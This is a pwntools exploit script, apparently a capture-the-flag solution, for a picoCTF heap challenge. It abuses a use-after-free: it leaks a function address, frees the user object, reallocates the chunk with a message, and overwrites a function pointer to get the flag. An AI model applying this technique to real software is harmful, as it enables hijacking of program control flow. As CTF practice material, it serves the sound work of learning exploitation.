'''
tags: `heap`, `uaf`, `tcache`

in function `leaveMessage`, msg will allocate the same size as **user**
target: call `hahaexploitgobrrr`

because end of each commands, call user->whatToDo

1. *S*: get the address of `hahaexploitgobrrr`
2. *I*: free the **user**
3. *l*: **msg** will allocate the original space allocated for **user**
    ->-> overwrite the first 4 bytes (the whatToDo pointer) to the address of `hahaexploitgobrrr`
    ->->-> call user->whatToDo == hahaexploitgobrrr
-> receive flag
'''
from pwn import *

host = 'mercury.picoctf.net'
port = 48259

elf = ELF('./vuln')

context.binary = elf
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b main
'''

# menu
def subscribe(r):
    r.sendlineafter(b'(e)xit\n', b'S')

def inquire(r, option):
    r.sendlineafter(b'(e)xit\n', b'I')
    r.sendlineafter(b'?\n', option)

def leave(r, msg):
    r.sendlineafter(b'(e)xit\n', b'l')
    r.sendlineafter(b':\n', msg)

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    subscribe(r)
    r.recvuntil(b'leak...')
    hahaexploitgobrrr = int(r.recvline()[2:-1], 16)
    inquire(r, b'Y')
    leave(r, p32(hahaexploitgobrrr))
    print (r.recvline()[:-1].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()